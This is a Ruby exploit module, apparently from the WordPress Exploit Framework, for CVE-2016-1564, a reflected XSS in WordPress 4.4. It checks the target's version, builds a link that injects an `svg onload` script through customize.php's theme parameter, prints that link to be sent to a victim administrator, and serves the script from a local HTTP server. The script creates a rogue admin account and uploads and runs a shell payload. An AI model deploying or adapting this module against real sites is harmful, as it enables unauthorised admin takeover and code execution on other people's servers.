# frozen_string_literal: true

class Wpxf::Exploit::Wp44XssShellUpload < Wpxf::Module
  include Wpxf
  include Wpxf::WordPress::Xss

  def initialize
    super

    update_info(
      name: 'WordPress 4.4 Reflected XSS Shell Upload',
      desc: 'This module prepares a payload and link that can be sent to an '\
            'admin user which when visited with a valid session will create '\
            'a new admin user which will be used to upload and execute the '\
            'selected payload in the context of the web server.',
      author: [
        'Crtc4L',    # Discovery and disclosure
        'rastating'  # WPXF module
      ],
      references: [
        ['CVE', '2016-1564'],
        ['WPVDB', '8358'],
        ['URL', 'https://wordpress.org/news/2016/01/wordpress-4-4-1-security-and-maintenance-release/'],
        ['URL', 'https://github.com/WordPress/WordPress/commit/7ab65139c6838910426567849c7abed723932b87']
      ],
      date: 'Jan 06 2016'
    )
  end

  def check
    version = wordpress_version
    return :unknown if version.nil?
    return :vulnerable if version == Gem::Version.new('4.4')
    :safe
  end

  def url_with_xss
    url = normalize_uri(wordpress_url_admin, 'customize.php')
    url + "?theme=<svg onload=#{xss_ascii_encoded_include_script}>"
  end

  def run
    return false unless super

    @success = false
    emit_info 'Provide the URL below to the victim to begin the payload upload'
    puts
    puts url_with_xss
    puts

    start_http_server
    @success
  end
end
